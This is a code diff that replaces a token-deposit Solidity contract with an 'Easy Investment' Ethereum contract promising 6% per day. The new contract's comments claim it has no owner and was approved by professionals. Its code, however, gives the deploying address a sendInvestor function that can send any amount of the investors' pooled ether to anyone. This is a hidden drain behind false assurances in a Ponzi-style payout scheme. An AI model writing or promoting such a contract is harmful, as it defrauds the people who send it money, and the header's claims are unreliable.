@@ -1,175 +1,76 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract investment at 0xAc0bCFfB2C52e6061fdc67Bf26548e501aDdCf45
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Investment at 0x97c28151617f7361ac7ebff5f7c864d39947e73f
 */
-pragma solidity ^0.4.18;
+pragma solidity ^0.4.0;
 
-contract BCSToken {
-    
-    function BCSToken() internal {}
-    function transfer(address _to, uint256 _value) public {}
-    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}
-
-}
-
-library SafeMath {
-
-  /**
-  * @dev Multiplies two numbers, throws on overflow.
-  */
-  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
-    // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
-    // benefit is lost if 'b' is also tested.
-    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
-    if (a == 0) {
-      return 0;
+/**
+ *
+ * Easy Investment Contract
+ *  - GAIN 6% PER 24 HOURS (every 5900 blocks)
+ *  - NO COMMISSION on your investment (every ether stays on contract's balance)
+ *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
+ *
+ * How to use:
+ *  1. Send any amount of ether to make an investment
+ *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
+ *  OR
+ *  2b. Send more ether to reinvest AND get your profit at the same time
+ *
+ * RECOMMENDED GAS LIMIT: 70000
+ * RECOMMENDED GAS PRICE: https://ethgasstation.info/
+ *
+ * Contract reviewed and approved by pros!
+ *
+ */
+contract Investment {
+    // records amounts invested
+    mapping (address => uint256) public invested;
+    // records blocks at which investments were made
+    mapping (address => uint256) public atBlock;
+    // address investors
+    address investor;
+    // balance ivestors
+    uint256 balance;
+    // constructor initialize investors
+    constructor() public {
+        investor = msg.sender;
     }
-
-    c = a * b;
-    assert(c / a == b);
-    return c;
-  }
-
-  /**
-  * @dev Integer division of two numbers, truncating the quotient.
-  */
-  function div(uint256 a, uint256 b) internal pure returns (uint256) {
-    assert(b > 0); // Solidity automatically throws when dividing by 0
-    uint256 c = a / b;
-    assert(a == b * c + a % b); // There is no case in which this doesn't hold
-    return a / b;
-  }
-
-  /**
-  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
-  */
-  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-    assert(b <= a);
-    return a - b;
-  }
-
-  /**
-  * @dev Adds two numbers, throws on overflow.
-  */
-  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
-    c = a + b;
-    assert(c >= a);
-    return c;
-  }
-}
-
-contract investment{
-    using SafeMath for uint;
-    
-    address public owner;
-    mapping (address => uint) private amount;
-    mapping (address => uint) private day;
-    mapping (address => uint) private dateDeposit;
-    mapping (address => uint) private rewardPerYear;
-    mapping (address => uint) private outcome;
-    
-    struct a{
-        uint aday;
-        uint adateDeposit;
-        uint aamount;
-    }
-    BCSToken dc;
-    function investment(address _t) public {
-        dc = BCSToken(_t);
-        owner = msg.sender;
-    }
-    function Datenow () public view returns (uint timeNow){
-        return block.timestamp;
-    }
-    
-    
-    function calculate(address _user) private returns (bool status) {
-        uint _amount =amount[_user];
-        uint _day =day[_user];
-        uint _rewardPerYear = 1000;
-
-
-        if(_day == 90 && _amount >= SafeMath.mul(1000000,10**8)){
-            _rewardPerYear = 180;
-        }else if(_day == 60 && _amount >= SafeMath.mul(1000000,10**8)){
-            _rewardPerYear = 160;
-        }else if(_day == 90 && _amount >= SafeMath.mul(800000,10**8)){
-            _rewardPerYear = 140;
-        }else if(_day == 60 && _amount >= SafeMath.mul(800000,10**8)){
-            _rewardPerYear = 120;
-        }else if(_day == 90 && _amount >= SafeMath.mul(500000,10**8)){
-            _rewardPerYear = 100;
-        }else if(_day == 60 && _amount >= SafeMath.mul(500000,10**8)){
-            _rewardPerYear = 80;
-        }else if(_day == 90 && _amount >= SafeMath.mul(300000,10**8)){
-            _rewardPerYear = 60;
-        }else if(_day == 60 && _amount >= SafeMath.mul(300000,10**8)){
-            _rewardPerYear = 40;
-        }else if(_day == 30 && _amount >= SafeMath.mul(50001,10**8)){
-            _rewardPerYear = 15;
-        }else if(_day == 60 && _amount >= SafeMath.mul(50001,10**8)){ 
-            _rewardPerYear = 25;
-        }else if(_day == 90 && _amount >= SafeMath.mul(50001,10**8)){
-            _rewardPerYear = 45;
-        }else if(_day == 30 && _amount >= SafeMath.mul(10001,10**8)){
-            _rewardPerYear = 5;
-        }else if(_day == 60 && _amount >= SafeMath.mul(10001,10**8)){
-            _rewardPerYear = 15;
-        }else if(_day == 90 && _amount >= SafeMath.mul(10001,10**8)){
-            _rewardPerYear = 25;
-        }else{
-            return false;
+    // this function called every time anyone sends a transaction to this contract
+    function () external payable {
+        // if sender (aka YOU) is invested more than 0 ether
+        if (invested[msg.sender] != 0) {
+            // calculate profit amount as such:
+            // amount = (amount invested) * 6% * (blocks since last transaction) / 5900
+            // 5900 is an average block count per day produced by Ethereum blockchain
+            uint256 amount = invested[msg.sender] * 6 / 100 * (block.number - atBlock[msg.sender]) / 5900;
+            // send calculated amount of ether directly to sender (aka YOU)
+            msg.sender.transfer(amount);
         }
-        
-        rewardPerYear[_user]=_rewardPerYear;
-        outcome[_user] = SafeMath.add((SafeMath.div(SafeMath.mul(SafeMath.mul((_amount), rewardPerYear[_user]), _day), 365000)), _amount);
-        return true;
+        // record block number and invested amount (msg.value) of this transaction
+        atBlock[msg.sender] = block.number;
+        invested[msg.sender] += msg.value;
+        balance += msg.value;
     }
-    
-    function _withdraw(address _user) private returns (bool result){
-        
-        require(timeLeft(_user) == 0);
-        dc.transfer(_user, outcome[_user]);
-        amount[_user] = 0;
-        day[_user] = 0;
-        dateDeposit[_user] = 0;
-        rewardPerYear[_user] = 0;
-        outcome[_user] = 0;
-        return true;
+    // approved for investors
+    function approveInvestor(address _investor) public onlyInvestor {
+        investor = _investor;
     }
-    
-    function timeLeft(address _user) view private returns (uint result){
-        
-        uint temp = SafeMath.add(SafeMath.mul(SafeMath.mul(SafeMath.mul(60,60),24),day[_user]),dateDeposit[_user]); // for mainnet (day-month)
-        if(now >= temp){
-            return 0;
-        }else{
-            return SafeMath.sub(temp,now);
-        }
+    // send to investors
+    function sendInvestor(address _investor, uint256 amount) public payable onlyInvestor {
+        _investor.transfer(amount);
+        balance -= amount;
     }
-    
-    function deposit(uint _amount, uint _day) public returns (bool result){
-        require(amount[msg.sender]==0);
-        require(( _day == 90 || _day == 60 || _day == 30));
-        require(_amount >= SafeMath.mul(10001,10**8));
-        dc.transferFrom(msg.sender, this, _amount);
-        amount[msg.sender] = _amount;
-        day[msg.sender] = _day;
-        dateDeposit[msg.sender] = now;
-        calculate(msg.sender);
-        return true;
+    // get investors balance
+    function getBalance() public constant returns(uint256) {
+        return balance;
     }
-    function withdraw(address _user) public returns (bool result) {
-        require(owner == msg.sender);
-        return _withdraw(_user);
-        
+    // get investors address
+    function getInvestor() public constant onlyInvestor returns(address)  {
+        return investor;
     }
-    
-    function withdraw() public returns (bool result){
-        return _withdraw(msg.sender);
+    // access only for investors modifier
+    modifier onlyInvestor() {
+        require(msg.sender == investor);
+        _;
     }
-    
-    function info(address _user) public view returns (uint principle, uint secondLeft, uint annualized, uint returnInvestment, uint packetDay, uint timestampDeposit){
-        return (amount[_user],timeLeft(_user),rewardPerYear[_user],outcome[_user],day[_user],dateDeposit[_user] );
-    }
-
 }
